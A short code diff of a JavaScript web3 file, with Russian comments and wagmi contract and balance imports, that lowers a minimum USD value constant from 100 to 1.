@@ -6,7 +6,7 @@ import { readContract, writeContract, sendCalls, getBalance } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = false;
-const MIN_VALUE_USD = 100;
+const MIN_VALUE_USD = 1;
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
